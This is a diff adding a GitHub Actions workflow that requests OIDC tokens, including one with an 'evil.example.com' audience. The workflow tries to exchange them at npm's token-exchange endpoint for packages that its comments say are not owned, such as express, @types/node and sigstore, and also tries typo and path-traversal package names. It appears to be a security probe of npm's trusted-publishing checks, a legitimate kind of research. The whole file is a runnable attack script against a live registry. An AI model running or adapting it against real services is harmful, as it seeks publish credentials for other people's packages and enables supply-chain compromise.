@@ -1,0 +1,42 @@
+name: oidcprobe
+on:
+  push:
+    branches: [main]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          set +e
+          NPM="https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package"
+          # Default OIDC token (npm-expected audience)
+          T_NPM=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
+          # Arbitrary audience token
+          T_AUD=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://evil.example.com" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
+          # No audience (default sub)
+          T_NOAUD=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
+          echo "===CLAIMS_NPM==="
+          echo "$T_NPM" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
+          probe(){ echo "===PROBE $1 pkg=$2==="; curl -s -m 20 -o /tmp/r -w "HTTP:%{http_code}\n" -X POST "$NPM/$2" -H "Authorization: Bearer $3" -H "Content-Type: application/json" -d '{}'; echo "BODY:"; cat /tmp/r; echo; }
+          # P1: npm-aud token, well-known pkg NOT owned by us (express) -> must reject
+          probe P1_express_npmaud express "$T_NPM"
+          # P2: npm-aud token, scoped pkg not owned (@types/node)
+          probe P2_typesnode_npmaud "@types%2fnode" "$T_NPM"
+          # P3: arbitrary-aud token vs express (aud confusion)
+          probe P3_express_evilaud express "$T_AUD"
+          # P4: no-aud token vs express
+          probe P4_express_noaud express "$T_NOAUD"
+          # P5: substring/typo package name games
+          probe P5_expresss "expresss" "$T_NPM"
+          # P6: path traversal in pkg name
+          probe P6_traversal "..%2f..%2fexpress" "$T_NPM"
+          # P7: a scoped pkg under OUR namespace that doesn't exist (would be our own - intended baseline)
+          probe P7_ourscope "@testyt2771-hub%2fprobe-pkg-xyz" "$T_NPM"
+          # P8: npm-aud token vs a real package that uses trusted publishers (provenance-enabled), e.g. sigstore
+          probe P8_sigstore "sigstore" "$T_NPM"
+          probe P9_npmcli "@npmcli%2farborist" "$T_NPM"
+          echo "===DONE==="
